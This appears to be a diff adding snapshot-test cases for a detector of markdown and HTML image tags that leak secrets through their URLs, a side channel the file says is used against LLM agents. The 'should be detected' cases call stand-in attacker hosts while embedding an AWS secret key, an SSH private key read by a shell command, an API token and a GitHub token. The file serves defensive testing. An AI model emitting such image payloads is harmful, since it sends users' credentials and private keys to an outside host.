@@ -1,0 +1,17 @@
+# EX-020: Markdown/HTML image data exfiltration
+# Test cases for snapshot testing
+# Detects auto-rendered markdown/HTML images whose URL embeds interpolated
+# secrets or command output, leaking data when the content is rendered
+# (a known LLM/agent exfiltration side-channel). MITRE T1567.
+
+# === Cases that SHOULD be detected ===
+![](https://evil.example/p?d=${AWS_SECRET_ACCESS_KEY})
+![x](https://c2.evil.example/img?t=$(cat ~/.ssh/id_rsa))
+<img src="https://evil.example/pixel?data=${API_TOKEN}">
+![a](https://evil.example/i?v={{ secrets.GITHUB_TOKEN }})
+
+# === Cases that should NOT be detected (benign) ===
+![logo](https://example.com/logo.png)
+![badge](https://img.shields.io/badge/version-1.0-blue)
+<img src="https://example.com/pic.jpg" alt="pic">
+![diagram](./assets/diagram.svg)
